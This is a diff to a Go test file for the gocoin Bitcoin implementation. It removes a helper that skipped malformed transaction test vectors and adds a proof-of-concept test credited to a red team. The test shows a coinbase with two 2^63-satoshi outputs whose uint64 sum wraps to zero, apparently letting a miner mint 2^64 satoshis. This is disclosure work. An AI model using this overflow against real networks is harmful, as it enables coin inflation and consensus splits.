@@ -97,45 +97,6 @@ func parserec(vv []interface{}, excluded_flags bool) (ret *testvector) {
 	return
 }
 
-// Some tests from the satoshi's json files are not applicable
-// for our architectre so lets just fake them.
-func skip_broken_tests(tx *btc.Tx) bool {
-	// No inputs
-	if len(tx.TxIn) == 0 {
-		return true
-	}
-
-	// Negative output
-	for i := range tx.TxOut {
-		if tx.TxOut[i].Value > btc.MAX_MONEY {
-			return true
-		}
-	}
-
-	// Duplicate inputs
-	if len(tx.TxIn) > 1 {
-		for i := 0; i < len(tx.TxIn)-1; i++ {
-			for j := i + 1; j < len(tx.TxIn); j++ {
-				if tx.TxIn[i].Input == tx.TxIn[j].Input {
-					return true
-				}
-			}
-		}
-	}
-
-	// Coinbase of w wrong size
-	if tx.IsCoinBase() {
-		if len(tx.TxIn[0].ScriptSig) < 2 {
-			return true
-		}
-		if len(tx.TxIn[0].ScriptSig) > 100 {
-			return true
-		}
-	}
-
-	return false
-}
-
 func execute_test_tx(t *testing.T, tv *testvector) bool {
 	if len(tv.inps) == 0 {
 		t.Error("Vector has no inputs")
@@ -153,10 +114,6 @@ func execute_test_tx(t *testing.T, tv *testvector) bool {
 	}
 	tx.Size = uint32(len(rd))
 	tx.SetHash(rd)
-
-	if skip_broken_tests(tx) {
-		return false
-	}
 
 	if !tx.IsCoinBase() {
 		for i := range tx.TxIn {
@@ -320,5 +277,48 @@ func TestSighash(t *testing.T) {
 				t.Error("SignatureHash mismatch at index", i)
 			}
 		}
+	}
+}
+
+
+// PoC: gocoin accepts a coinbase whose outputs total 2^64 satoshis.
+//
+// Bitcoin Core rejects such transactions in CheckTransaction
+// (src/consensus/tx_check.cpp): bad-txns-vout-negative /
+// bad-txns-vout-toolarge / bad-txns-txouttotal-toolarge.
+// Gocoin performs no output value checks and its uint64 sums wrap,
+// so the block-level checks in chain.commitTxs pass.
+//
+// Drop this file into lib/script/ and run:
+//   go test -v -run TestPoCValueOverflow
+//
+// Credits: Bitcoin Red Team / @brunoerg
+
+func TestPoCValueOverflow(t *testing.T) {
+	// Coinbase with two outputs of 2^63 satoshis each (184.4 billion BTC total)
+	tx := new(btc.Tx)
+	tx.Version = 1
+	tx.TxIn = []*btc.TxIn{{Input: btc.TxPrevOut{Vout: 0xffffffff}, ScriptSig: []byte{3, 1, 2, 3}}}
+	tx.TxOut = []*btc.TxOut{
+		{Value: 1 << 63, Pk_script: []byte{0x51}},
+		{Value: 1 << 63, Pk_script: []byte{0x51}},
+	}
+	tx.NoWitSize = 100
+
+	er := tx.CheckTransaction()
+
+	// the exact summation done by chain.commitTxs() (lib/chain/chain_accept.go)
+	var txoutsum, sumblockin, sumblockout uint64
+	sumblockin = btc.GetBlockReward(850000) // current subsidy
+	for j := range tx.TxOut {
+		txoutsum += tx.TxOut[j].Value
+	}
+	sumblockout += txoutsum
+
+	t.Logf("CheckTransaction error: %v", er)
+	t.Logf("coinbase outputs total: 2 x 2^63 sat = %.0f BTC each", float64(uint64(1)<<63)/1e8)
+	t.Logf("wrapped txoutsum: %d ; block check 'sumblockin < sumblockout' fails: %v", txoutsum, sumblockin < sumblockout)
+	if er == nil && txoutsum == 0 && !(sumblockin < sumblockout) {
+		t.Error("CONSENSUS DIVERGENCE CONFIRMED: 2^64 satoshis can be minted by a gocoin miner")
 	}
 }
